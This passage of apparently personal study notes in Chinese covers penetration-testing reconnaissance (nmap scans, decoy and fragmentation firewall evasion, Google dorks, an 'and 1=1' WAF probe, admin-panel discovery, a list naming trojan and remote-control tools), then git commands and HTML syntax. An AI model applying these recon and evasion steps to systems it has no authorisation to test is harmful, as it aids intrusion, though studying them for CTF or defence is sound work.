-sS（s表明扫描方式,S表明SYN扫描）</h2></li><li>秘密的扫描方式</li><li>Client和Server之间没有形成三次握手，所以没有简历一个正常的TCP链接</li><li>不会被防火墙和日志所记录，一般不会在目标主机上留下任何痕迹，但是这种扫描需要root权限<h2 id="使用UDP-ping探测主机"><a href="#使用UDP-ping探测主机" class="headerlink" title="使用UDP ping探测主机"></a>使用UDP ping探测主机</h2>nmap -PU xxx<h2 id="服务器版本探测"><a href="#服务器版本探测" class="headerlink" title="服务器版本探测"></a>服务器版本探测</h2>nmap -sV xxx</li><li>服务器版本即服务器系统的版本<h2 id="精确地确认端口上运行的服务"><a href="#精确地确认端口上运行的服务" class="headerlink" title="精确地确认端口上运行的服务"></a>精确地确认端口上运行的服务</h2>nmap -sV –script unusual-port xxx<h2 id="探测目标主机的操作系统"><a href="#探测目标主机的操作系统" class="headerlink" title="探测目标主机的操作系统"></a>探测目标主机的操作系统</h2></li><li>nmap -O xxx</li><li>nmap -A xxx</li><li>-oN 导出扫描结果</li><li>-oX 导出扫描结果xml格式  </li><li>nmap -A xxx -oX c:\123.xml<h2 id="防火墙躲避绕过"><a href="#防火墙躲避绕过" class="headerlink" title="防火墙躲避绕过"></a>防火墙躲避绕过</h2></li><li>-f 分片绕过</li><li>-D 使用诱饵隐蔽扫描： nmap -D 1.1.1.1,222.222.222.222 xxx</li><li>–source-port 源端口欺骗<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1></li><li>syn扫描器</li><li>扫描外围主机网段</li><li>对应端口爆破工具</li><li>提供访问木马服务器下载的工具</li><li>一个远控<h1 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h1></li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
          <category> 定义 </category>
          
          <category> IP </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> 定义 </tag>
            
            <tag> IP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域名信息</title>
      <link href="/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8A/"/>
      <url>/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="IP概念"><a href="#IP概念" class="headerlink" title="IP概念"></a>IP概念</h1><ol><li>网络地址：可以用来识别设备所在的网络，网络地址位于IP地址的前端，企业申请IP地址时，获得的不是IP地址，而是唯一的能够识别的网络地址</li><li>主机地址：位于IP地址的后段，可以用来是被网络上的设备，同一网络上的设备都会有相同的网络地址，而各台设备之间通过主机地址来区别<h1 id="IPV6"><a href="#IPV6" class="headerlink" title="IPV6"></a>IPV6</h1></li><li>版本（4）：IPV6协议版本，其值为6，负责向处理机所运行的IP软件指名此IP数据是IPV6版本</li><li>优先级（4）</li><li>流标号（24）<h1 id="对应IP收集"><a href="#对应IP收集" class="headerlink" title="对应IP收集"></a>对应IP收集</h1></li><li>ping 域名：可以初步获取该地址的服务器相关信息</li><li>相关域名对应IP,相关工具：nslookup：nslookup endl 地址<h1 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h1><a href="http://www.baidu.com/">www.baidu.com</a></li><li>www.或bbs.为主机名，是主机头</li><li>baidu.com为主域名</li><li>bbs.baidu.com或edu.baidu.com为该主域名下的子域名</li><li>子域名的防御性没有主域名高，子域名可能跟主域名在一个服务器上，通过子域名也可以渗透到主域名</li><li>根据主站点来查找:site.baidu.com</li><li>使用layer子域名挖掘机：输入域名，端口，选择暴力枚举还是解析接口</li><li>可以发现多个域名用一个IP<h1 id="whois-注册人-信息查询"><a href="#whois-注册人-信息查询" class="headerlink" title="whois(注册人)信息查询"></a>whois(注册人)信息查询</h1></li><li>根据已知域名反查，分析出此域名的注册人，邮箱。电话</li><li>工具：爱站网，输入域名后点击whois查询<h1 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h1>目的：搜集信息</li><li>扫robots.txt，其中定义了哪些页面不允许爬行（定义的都是一些敏感的）</li><li>安装包（backup）:<a href="http://www.root.rar/zip;beifen.rar/zip;tar.gz">www.root.rar/zip;beifen.rar/zip;tar.gz</a></li><li>上传目录:ewebedit;ckfinder</li><li>mysql:phpmyadmin:pmd/pma/phadmin</li><li>phpinfo</li><li>编辑器</li><li>iis短文件<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2></li><li>字典爆破：御剑：输入域名之后直接开始扫目录</li><li>蜘蛛爬行：菜刀：开spider（蜘蛛爬取），输入域名之后开始爬取（菜刀是轻量级的，所有扫出来的结果将放到桌面）<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><h2 id="记得查常用端口"><a href="#记得查常用端口" class="headerlink" title="记得查常用端口"></a>记得查常用端口</h2><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><h2 id="portscan-收录在CTFtools中"><a href="#portscan-收录在CTFtools中" class="headerlink" title="portscan(收录在CTFtools中)"></a>portscan(收录在CTFtools中)</h2></li><li>输入起止IP</li><li>设置端口</li><li>点击start<h2 id="ntscan"><a href="#ntscan" class="headerlink" title="ntscan"></a>ntscan</h2><h2 id="telnet-是Windows自带的链接端口的工具"><a href="#telnet-是Windows自带的链接端口的工具" class="headerlink" title="telnet(是Windows自带的链接端口的工具)"></a>telnet(是Windows自带的链接端口的工具)</h2></li><li>格式：telnet 域名 端口（telnet <a href="http://qufutuan.com/">http://qufutuan.com</a> 3306）<h1 id="旁站c站"><a href="#旁站c站" class="headerlink" title="旁站c站"></a>旁站c站</h1><h1 id="整站分析"><a href="#整站分析" class="headerlink" title="整站分析"></a>整站分析</h1><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2></li><li>windows/linux<h2 id="脚本格式"><a href="#脚本格式" class="headerlink" title="脚本格式"></a>脚本格式</h2></li><li>asp aspx php jsp<h2 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h2></li><li>access</li><li>sqlserver</li><li>oracle</li><li>db2</li><li>postgresql</li><li>sqlite<h2 id="防护情况waf"><a href="#防护情况waf" class="headerlink" title="防护情况waf"></a>防护情况waf</h2></li><li>web application firewall<h2 id="cms类型"><a href="#cms类型" class="headerlink" title="cms类型"></a>cms类型</h2></li><li>dedecms</li><li>diguo</li><li>meterinfo</li><li>dz<h2 id="获取cms"><a href="#获取cms" class="headerlink" title="获取cms"></a>获取cms</h2></li><li>使用yunsee输入域名后查询：web指纹，语言，数据库，容器，服务器IP，操作系统<h2 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h2><h3 id="判断是什么脚本"><a href="#判断是什么脚本" class="headerlink" title="判断是什么脚本"></a>判断是什么脚本</h3></li><li>/index.php若正常则为php脚本</li><li>/index.asp若正常则为asp脚本</li><li>/index.asps若正常则为aspx脚本</li><li>/index.jsp若正常则为jsp脚本<h3 id="判断操作系统"><a href="#判断操作系统" class="headerlink" title="判断操作系统"></a>判断操作系统</h3></li><li>windows不区分大小写，Linux区分大小写</li><li>输入/index.phP(即修改一个字母)若正常则为windows，不正常则为linux（当php脚本存在时）</li><li>注意区分脚本类型<h3 id="测waf"><a href="#测waf" class="headerlink" title="测waf"></a>测waf</h3></li><li>输入and 1=1</li><li>waf会拦截and这一类的参数<h1 id="谷歌hacker"><a href="#谷歌hacker" class="headerlink" title="谷歌hacker"></a>谷歌hacker</h1></li><li>intext:查找网页中含有xx关键字的网站（intext: 管理员登录）</li><li>intitle:查找某个标题（intitle: 后台登录）</li><li>Filetype：查找某个文件类型的文件(数据挖掘 filetype: doc)</li><li>inurl:查找url中带有某字段的网站（inurl: php?id=）</li><li>Site:在某域名中查找信息<h1 id="url采集"><a href="#url采集" class="headerlink" title="url采集"></a>url采集</h1><h1 id="后台查找"><a href="#后台查找" class="headerlink" title="后台查找"></a>后台查找</h1><h2 id="弱口令默认后台"><a href="#弱口令默认后台" class="headerlink" title="弱口令默认后台"></a>弱口令默认后台</h2></li><li>admin,admin/login.asp,manage,login.asp<h2 id="查看网页的链接（超链接）"><a href="#查看网页的链接（超链接）" class="headerlink" title="查看网页的链接（超链接）"></a>查看网页的链接（超链接）</h2></li><li>一般来说，网页的主页有管理登录类似的东西，有些可能被管理员删掉</li><li>选择图片等获取链接，从中截取前半部分关于后台的链接，看看是否能访问<h2 id="查看网站使用的管理系统，从而确定后台"><a href="#查看网站使用的管理系统，从而确定后台" class="headerlink" title="查看网站使用的管理系统，从而确定后台"></a>查看网站使用的管理系统，从而确定后台</h2><h2 id="使用工具查找"><a href="#使用工具查找" class="headerlink" title="使用工具查找"></a>使用工具查找</h2></li><li>御剑</li><li>蜘蛛（菜刀）<h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h2></li><li>robots.txt文件告诉蜘蛛程序在服务器上什么样的文件可以被查看<h2 id="googlehacker"><a href="#googlehacker" class="headerlink" title="googlehacker"></a>googlehacker</h2><h2 id="短文件利用"><a href="#短文件利用" class="headerlink" title="短文件利用"></a>短文件利用</h2></li><li>如果有administrator121321312.asp,那么可以直接输入/a<del>!.asp(开头char加</del>加！加文件类型)<h1 id="CDN绕过方法（信息收集上最后）"><a href="#CDN绕过方法（信息收集上最后）" class="headerlink" title="CDN绕过方法（信息收集上最后）"></a>CDN绕过方法（信息收集上最后）</h1><h2 id="什么是CDN"><a href="#什么是CDN" class="headerlink" title="什么是CDN"></a>什么是CDN</h2></li><li>内容分发网络（访问加速）</li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
          <category> 定义 </category>
          
          <category> IP </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> 定义 </tag>
            
            <tag> IP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git</title>
      <link href="/git/"/>
      <url>/git/</url>
      
        <content type="html"><![CDATA[<h1 id="git"><a href="#git" class="headerlink" title="git"></a>git</h1><h2 id="将历史版本代码用树的形式来整合利用"><a href="#将历史版本代码用树的形式来整合利用" class="headerlink" title="将历史版本代码用树的形式来整合利用"></a>将历史版本代码用树的形式来整合利用</h2><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ol><li>工作区：仓库的目录</li><li>暂存区：数据暂时存放的区域，类似于工作区写入版本库前的缓存区，暂存区是独立于各个分支的</li><li>版本库：存放所有已经提交到本地仓库的代码版本</li><li>版本结构：树结构，树中每个节点代表一个代码版本<h2 id="git命令"><a href="#git命令" class="headerlink" title="git命令"></a>git命令</h2></li><li>git config –global user.name xxx:设置全局用户名，信息将记录在~/.gitconfig文件中</li><li>git config –global user.email <a href="mailto:&#120;&#x78;&#x78;&#x40;&#120;&#120;&#x78;&#46;&#x63;&#111;&#x6d;">&#120;&#x78;&#x78;&#x40;&#120;&#120;&#x78;&#46;&#x63;&#111;&#x6d;</a>:设置全局邮箱地址，信息将记录在~/.gitconfig文件中</li><li>git init：将当前目录配置成git仓库，信息将记录在隐藏的.git文件夹中</li><li>git add xxx:将xxx文件添加到暂存区</li><li>git add .:将所有待加入暂存区的文件加入暂存区</li><li>git rm –catched xx:将文件从仓库索引目录中删掉</li><li>git log :查看xx当前分支中的所有版本 </li><li>git reflog : 查看HEAD指针的移动历史</li><li>git reset –hard HEAD^或git reset –hard HEAD~：将代码库回滚到上个版本</li><li>git reset –hard HEAD^^回滚两次，以此类推</li><li>git reset –hard HEAD~num:回滚num次</li><li>git reset –hard 版本号：回滚到某一特定版本</li><li>git checkout - XX 或 git restore XX :将XX文件尚未加入暂存区的修改全部撤销</li><li>git remote add origin <a href="mailto:&#x67;&#105;&#x74;&#64;&#x67;&#105;&#x74;&#x2e;&#x61;&#99;&#x77;&#x69;&#110;&#x67;&#46;&#99;&#111;&#x6d;">&#x67;&#105;&#x74;&#64;&#x67;&#105;&#x74;&#x2e;&#x61;&#99;&#x77;&#x69;&#110;&#x67;&#46;&#99;&#111;&#x6d;</a>:…将本地仓库关联到远程仓库</li><li>git push -u:将当前分支推送到远程仓库（第一次需要0u，以后不需要）</li><li>git push origin branch_name:将本地的某个分支推送到远程仓库</li><li>git clone <a href="mailto:&#x67;&#105;&#116;&#64;&#103;&#105;&#116;&#46;&#x61;&#x63;&#119;&#x69;&#x6e;&#103;&#x2e;&#99;&#x6f;&#109;">&#x67;&#105;&#116;&#64;&#103;&#105;&#116;&#46;&#x61;&#x63;&#119;&#x69;&#x6e;&#103;&#x2e;&#99;&#x6f;&#109;</a>:…将远程仓库xxx下载到当前目录下</li><li></li></ol><h1 id="节点只负责存储版本，注意区分暂存区和工作区"><a href="#节点只负责存储版本，注意区分暂存区和工作区" class="headerlink" title="节点只负责存储版本，注意区分暂存区和工作区"></a>节点只负责存储版本，注意区分暂存区和工作区</h1><ol><li>git restore xxx:将工作区的文件回滚到暂存区版本</li><li>git restore –staged xxx:将暂存区的版本回滚到库中版本</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML语法规范</title>
      <link href="/HTML%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/"/>
      <url>/HTML%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/</url>
      
        <content type="html"><![CDATA[<span class="label label-info">info</span><h2 id="XHTML的出现是为了过渡到xml"><a href="#XHTML的出现是为了过渡到xml" class="headerlink" title="XHTML的出现是为了过渡到xml"></a>XHTML的出现是为了过渡到xml</h2><h2 id="HTML中不区分大小写，但是我们一般都使用小写"><a href="#HTML中不区分大小写，但是我们一般都使用小写" class="headerlink" title="HTML中不区分大小写，但是我们一般都使用小写"></a>HTML中不区分大小写，但是我们一般都使用小写</h2><h2 id="HTML的注释不能嵌套（就和c-中的if-else一样）"><a href="#HTML的注释不能嵌套（就和c-中的if-else一样）" class="headerlink" title="HTML的注释不能嵌套（就和c++中的if-else一样）"></a>HTML的注释不能嵌套（就和c++中的if-else一样）</h2><h2 id="HTML标签必须结构完整，要么成对出现，要么自结束标签"><a href="#HTML标签必须结构完整，要么成对出现，要么自结束标签" class="headerlink" title="HTML标签必须结构完整，要么成对出现，要么自结束标签"></a>HTML标签必须结构完整，要么成对出现，要么自结束标签</h2><ol><li>浏览器会尽最大努力正确解析页面，不符合语法规范的内容，浏览器会自动修正</li><li>但是有些情况会修正错误<h1 id="F12会跳出开发者控制台"><a href="#F12会跳出开发者控制台" class="headerlink" title="F12会跳出开发者控制台"></a>F12会跳出开发者控制台</h1><h2 id="自结束标签："><a href="#自结束标签：" class="headerlink" title="自结束标签："></a>自结束标签：</h2></li><li>html5中&lt; br &gt;</li><li>xhtml中&lt; br /&gt;(最后有反斜杠)<h2 id="HTML标签可以嵌套，但是不能交叉嵌套"><a href="#HTML标签可以嵌套，但是不能交叉嵌套" class="headerlink" title="HTML标签可以嵌套，但是不能交叉嵌套"></a>HTML标签可以嵌套，但是不能交叉嵌套</h2><h2 id="HTML标签中的属性必须有值，且值必须加引号"><a href="#HTML标签中的属性必须有值，且值必须加引号" class="headerlink" title="HTML标签中的属性必须有值，且值必须加引号"></a>HTML标签中的属性必须有值，且值必须加引号</h2></li><li>&lt; font color=”red” &gt;</li><li>单双引号均可</li></ol><h1 id="live-server快捷键"><a href="#live-server快捷键" class="headerlink" title="live-server快捷键"></a>live-server快捷键</h1><ol><li>写标签的名字后按tab键补全</li><li>写开始标签，回车自动补全</li><li>ctrl+/，自动生成注释标签</li></ol><h1 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h1><h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><ol><li>HTML中元素指的是从开始标签到结束标签的所有代码，或者开放标签和闭合标签</li></ol><h1 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h1><ol><li>在网页中，编写的多个空格，会被浏览器自动解析为一个空格</li><li>在html中我们不能直接书写一些特殊符号，比如连续多个空格，比如字母两侧的大于和小于号</li><li>如果我们需要在网页中书写这些符号，需要使用html中的实体（转义字符）</li><li>实体的语法<pre class="line-numbers language-none"><code class="language-none">&amp;实体的名字;    &amp;nbsp;空格    &gt;大于号    &lt;小于号    &amp;copy;版权符号&amp;开头;结尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a>meta标签</h1><pre class="line-numbers language-none"><code class="language-none">定义：the html &lt;meta&gt; represents metadata that cannot be represented by other html meta related elements,like &lt;base&gt;,&lt;link&gt;,&lt;script&gt;,&lt;style&gt;,&lt;title&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="可以提供页面元信息"><a href="#可以提供页面元信息" class="headerlink" title="可以提供页面元信息"></a>可以提供页面元信息</h2><pre class="line-numbers language-none"><code class="language-none">元信息是指描述自身的信息，元信息类标签是指html中用于描述文档自身的一类标签通常出现在head标签中，提供给浏览器或者搜索引擎阅读的，一般不会显示给用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="meta标签永远位于head元素内部"><a href="#meta标签永远位于head元素内部" class="headerlink" title="meta标签永远位于head元素内部"></a>meta标签永远位于head元素内部</h2><h2 id="属性："><a href="#属性：" class="headerlink" title="属性："></a>属性：</h2><pre class="line-numbers language-none"><code class="language-none">content指定的数据内容    charset: 指定网页的字符集    name: 指定数据的名称    content： 指定数据的内容    keywords: 表示网站的关键字    description: 用于指定网站的描述,显示在搜索引擎中的搜索结果中title标签的内容会作为搜索结果的超链接上的文字显示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/11/ZpA93mTEXU82Yr4.png"></p><h3 id="必须"><a href="#必须" class="headerlink" title="必须"></a>必须</h3><ol><li>content:定义与http-equiv或name属性相关的元信息（使用，进行分割）<h3 id="可选："><a href="#可选：" class="headerlink" title="可选："></a>可选：</h3></li><li>http-equiv:把content属性关联到HTTP头部</li><li>name:把content属性关联到一个名称– name和content是一对关键字</li><li>scheme:定义用于翻译content属性值的格式</li><li>description:<img src="https://s2.loli.net/2022/05/11/QjIFcrkgbGBCHPO.png"></li></ol><h4 id="name"><a href="#name" class="headerlink" title="name"></a>name</h4><ol><li>keywords:为文档定义了一组关键字，某些搜索引擎在遇到这些关键字时会用这些关键字对文档进行分类。&lt; meta name=”keywords” content=”HTML,ASP,PHP” /&gt;(会将HTML等内容进行转keywords操作，content内容使用,进行分割)</li></ol><h3 id="http-equiv"><a href="#http-equiv" class="headerlink" title="http-equiv"></a>http-equiv</h3><pre class="line-numbers language-none"><code class="language-none">用来设置http协议，将一个页面重定向到另一个网站，<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>为名称/值对提供了名称，并指示服务器在发送实际的文档之前先要传送给浏览器的MIME文档头部包含名称值对。</li><li>当服务器向浏览器发送文档时，会先发送许多名称/值对，但是所有的服务器都至少要发送一个。</li><li>使用带有http-equiv属性的meta标签时，服务器将把名称/值对添加到发送给浏览器的内容头部</li><li>&lt; meta http-equiv=”charset” content=”iso-8859-1”&gt;</li><li><img src="https://s2.loli.net/2022/05/11/QNcIihLlHoBgq2U.png"></li><li>其中3表示时间，url表示往哪跳转，重定向到哪.之间用什么间隔<h3 id="content"><a href="#content" class="headerlink" title="content"></a>content</h3></li><li>提供了名称/值对中的值，该值可以是任何有效的字符串</li><li>content属性始终要和name属性或http-equiv属性一起使用<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2></li><li>&lt; meta http-equiv=”Refresh” content=”间隔时间；url=跳转页面的url”&gt;</li></ol><h1 id="常用的标签："><a href="#常用的标签：" class="headerlink" title="常用的标签："></a>常用的标签：</h1><h2 id="二者之间的关系"><a href="#二者之间的关系" class="headerlink" title="二者之间的关系"></a>二者之间的关系</h2><ol><li>一般情况下会在块元素中放行内元素</li><li>而不会在行内元素中放块元素</li><li>块元素中一般什么都能放</li><li>但是尤其注意：p元素中不能放任何的块元素<br><img src="https://s2.loli.net/2022/05/12/QuWLGEeUR6FXwmc.png"><br><img src="https://s2.loli.net/2022/05/12/HaYZM1bfSoLrFQJ.png"></li></ol><h2 id="在页面中独占一行的元素称为块元素block-element"><a href="#在页面中独占一行的元素称为块元素block-element" class="headerlink" title="在页面中独占一行的元素称为块元素block element"></a>在页面中独占一行的元素称为块元素block element</h2><ol><li>在页面中一般通过块元素来对页面进行宏观布局</li><li><img src="https://s2.loli.net/2022/05/12/96Cd5z1Z2fqwMFv.png"><h3 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h3></li><li>HTML中一共有六级标签：h1~h6</li><li>h1最大，为一级；h6为最小，为6级</li><li>一般不用，主要是css来修改</li><li>使用HTML标签时，关心的是标签的语义，我们使用的标签都是语义化标签</li><li>6级标签中，h1最重要，表示一个网页中的主要内容，h2~h6的重要性一次降低</li><li>搜索引擎先搜素title标签，然后就会搜索标题标签，从h1到h6</li></ol><h4 id="对于搜索引擎来说，h1的重要性仅次于title-搜索引擎检索完title，会立即查看h1中的内容"><a href="#对于搜索引擎来说，h1的重要性仅次于title-搜索引擎检索完title，会立即查看h1中的内容" class="headerlink" title="对于搜索引擎来说，h1的重要性仅次于title,搜索引擎检索完title，会立即查看h1中的内容"></a>对于搜索引擎来说，h1的重要性仅次于title,搜索引擎检索完title，会立即查看h1中的内容</h4><ol><li>h1标签非常重要，会影响页面再搜索引擎中的排名，页面只能写一个h1</li><li>一般页面标题中只使用h1,h2,h3，h3以后的基本不使用<br><img src="https://s2.loli.net/2022/05/11/evhY6jZuxoz3qRH.png"></li></ol><h4 id="lt-hgroup-gt"><a href="#lt-hgroup-gt" class="headerlink" title="&lt; hgroup&gt;"></a>&lt; hgroup&gt;</h4><ol><li>hgroup用来为标题分组，剋将一组相关的标题同时放入到hgroup</li><li>分组的目的是用css单独控制这个组，方便修改样式</li></ol><p><img src="https://s2.loli.net/2022/05/11/Qndbqt1LljZuIz7.png"></p><pre class="line-numbers language-none"><code class="language-none">&lt;hgroup&gt;    &lt;h1&gt;...&lt;&#x2F;h1&gt;    &lt;h2&gt;...&lt;&#x2F;h2&gt;&lt;&#x2F;hgroup&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="lt-header-gt-标签"><a href="#lt-header-gt-标签" class="headerlink" title="&lt; header&gt;标签"></a>&lt; header&gt;标签</h4><ol><li>&lt; header&gt;&lt;/ header&gt;<br><img src="https://s2.loli.net/2022/05/13/A3rjc1Gludx48Q7.png"></li><li>定义网页的头部</li><li>可以是网页的某一个部分的头部，所以header标签可以不只有一个</li></ol><h4 id="lt-main-gt"><a href="#lt-main-gt" class="headerlink" title="&lt; main&gt;"></a>&lt; main&gt;</h4><ol><li>网页的主体部分</li><li>和c++main函数一样，一个页面中只能有一个</li></ol><h4 id="lt-footer-gt"><a href="#lt-footer-gt" class="headerlink" title="&lt; footer&gt;"></a>&lt; footer&gt;</h4><ol><li>网页的底部<br><img src="https://s2.loli.net/2022/05/13/9qymkQrbfwnPjig.png"></li><li>可以是网页的某一个部分的底部，所以footer标签不只有一个</li></ol><h4 id="lt-nav-gt"><a href="#lt-nav-gt" class="headerlink" title="&lt; nav&gt;"></a>&lt; nav&gt;</h4><ol><li>表示网页的导航</li><li><img src="https://s2.loli.net/2022/05/13/GAeNYhfSF3ksCgH.png"></li><li><img src="https://s2.loli.net/2022/05/14/3yTkS2FtmL5HfAN.png"></li><li>&lt; nav&gt;标签里面放&lt; a&gt;(超链接)<pre class="line-numbers language-none"><code class="language-none">&lt;nav&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&gt;baidu&lt;&#x2F;a&gt;&lt;nav&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="lt-aside-gt"><a href="#lt-aside-gt" class="headerlink" title="&lt; aside&gt;"></a>&lt; aside&gt;</h4><ol><li>和主体相关又不属于主体</li><li>对文章中的某一个字或词在旁边进行图解注释<br><img src="https://s2.loli.net/2022/05/13/gKvtkwVUAzMqjPo.png"></li></ol><h4 id="lt-article-gt"><a href="#lt-article-gt" class="headerlink" title="&lt; article&gt;"></a>&lt; article&gt;</h4><ol><li>表示一个独立的文章</li><li>每一个独立的&lt; article&gt;都可以插入小的&lt; article&gt;</li></ol><h4 id="lt-section-gt"><a href="#lt-section-gt" class="headerlink" title="&lt; section&gt;"></a>&lt; section&gt;</h4><ol><li>表示一个独立的区块(其它)</li><li>上面的标签都不能表示时，使用section</li><li>例如header里面放三个section<br><img src="https://s2.loli.net/2022/05/13/87bqE6IzhRxBsrp.png"></li></ol><h4 id="lt-div-gt"><a href="#lt-div-gt" class="headerlink" title="&lt; div&gt;"></a>&lt; div&gt;</h4><ol><li>没有语义，就是用来表示一个区块</li><li>上面的&lt; hgroup&gt;,&lt; header&gt;,&lt; aside&gt;,&lt; article&gt;,&lt; section&gt;,&lt; nav&gt;都可以用div来代替</li></ol><h3 id="段落标签"><a href="#段落标签" class="headerlink" title="段落标签"></a>段落标签</h3><ol><li>用于表示内容中的一个自然段，使用p标签来表示一个段落</li><li>&lt; p&gt;中间放段落&lt; /p&gt;</li><li>p标签中的文字，默认会独占一行，并且段和段之间会有一个间</li><li>但是如果没有p标签则会出现在一行，并且行与行之间没有间距</li></ol><h3 id="lt-br-gt"><a href="#lt-br-gt" class="headerlink" title="&lt; br&gt;"></a>&lt; br&gt;</h3><ol><li>在页面中也可以使用br标签来表示一个换行，br标签是一个自结束标签<br /></li></ol><h3 id="lt-hr-gt"><a href="#lt-hr-gt" class="headerlink" title="&lt; hr&gt;"></a>&lt; hr&gt;</h3><ol><li>&lt; hr /&gt;，hr标签也是一个自结束标签，可以在页面中生成一条水平线</li></ol><h1 id="在页面中不会独占一行的元素称为行内元素（inline-element"><a href="#在页面中不会独占一行的元素称为行内元素（inline-element" class="headerlink" title="在页面中不会独占一行的元素称为行内元素（inline element)"></a>在页面中不会独占一行的元素称为行内元素（inline element)</h1><ol><li>和布局无关</li><li>主要用来包裹文字</li></ol><h2 id="lt-em-gt-加重语气标签"><a href="#lt-em-gt-加重语气标签" class="headerlink" title="&lt; em&gt;加重语气标签"></a>&lt; em&gt;加重语气标签</h2><ol><li>样式会和其它的没有em的字体不同，可能会斜体，突出</li><li>没有换行</li><li>只是语气的加重</li></ol><h2 id="lt-strong-gt"><a href="#lt-strong-gt" class="headerlink" title="&lt; strong&gt;"></a>&lt; strong&gt;</h2><ol><li>表示强调，重要内容</li><li>是整体的强调作用</li></ol><h2 id="lt-q-gt"><a href="#lt-q-gt" class="headerlink" title="&lt; q&gt;"></a>&lt; q&gt;</h2><ol><li>表示引用</li><li>短引用</li><li>会有引号，但是不会缩进</li></ol><h2 id="lt-blockquote-gt"><a href="#lt-blockquote-gt" class="headerlink" title="&lt; blockquote&gt;"></a>&lt; blockquote&gt;</h2><ol><li>块引用(长引用)</li><li>会缩进，没有引号</li></ol><h2 id="lt-span-gt"><a href="#lt-span-gt" class="headerlink" title="&lt; span&gt;"></a>&lt; span&gt;</h2><ol><li>行内元素，没有任何的语义，一般用于在网页中选中文字</li></ol><h1 id="浏览器的自动修正"><a href="#浏览器的自动修正" class="headerlink" title="浏览器的自动修正"></a>浏览器的自动修正</h1><ol><li>浏览器在解析网页时，会对网页中不符合规范的内容进行修正</li><li>比如标签写在了根&lt; html&gt;的外部</li><li>p元素中嵌套了块元素</li><li>根元素中出现了head和body以外的子元素<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2></li><li>修正的不是源码</li><li>而是源码在内存中的形式</li><li>看的是f12打开后的element元素</li><li><img src="https://s2.loli.net/2022/05/12/5LTbZUdfRzYraI6.png"></li></ol><h1 id="实体-1"><a href="#实体-1" class="headerlink" title="实体"></a>实体</h1><h2 id="在HTML中-lt-gt-这种特殊字符不能直接使用（-lt-gt-会被解析为标签）"><a href="#在HTML中-lt-gt-这种特殊字符不能直接使用（-lt-gt-会被解析为标签）" class="headerlink" title="在HTML中&lt; &gt;这种特殊字符不能直接使用（&lt;&gt;会被解析为标签）"></a>在HTML中&lt; &gt;这种特殊字符不能直接使用（&lt;&gt;会被解析为标签）</h2><ol><li>需要使用一些特殊的符号来表示这些特殊字符，这些特殊符号我们称为实体（转义字符串）</li><li>浏览器解析到实体时，会自动将实体转换为其对应的字符</li></ol><h2 id="在HTML中，字符之间写再多的空格，浏览器也会当成一个空格解析，换行也会当成一个空格解析"><a href="#在HTML中，字符之间写再多的空格，浏览器也会当成一个空格解析，换行也会当成一个空格解析" class="headerlink" title="在HTML中，字符之间写再多的空格，浏览器也会当成一个空格解析，换行也会当成一个空格解析"></a>在HTML中，字符之间写再多的空格，浏览器也会当成一个空格解析，换行也会当成一个空格解析</h2><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><ol><li>&amp;实体的名字（将linux系统操作的-换位&amp;）(只能说是一部分)</li><li>小于&lt; -lt</li><li>大于&gt; -gt</li><li>空格&nbsp;(牛逼space)(no break space，即不会换行的空格)</li><li>版权符号 &amp;copy（不让你copy）<h3 id="amp-开头，；结尾"><a href="#amp-开头，；结尾" class="headerlink" 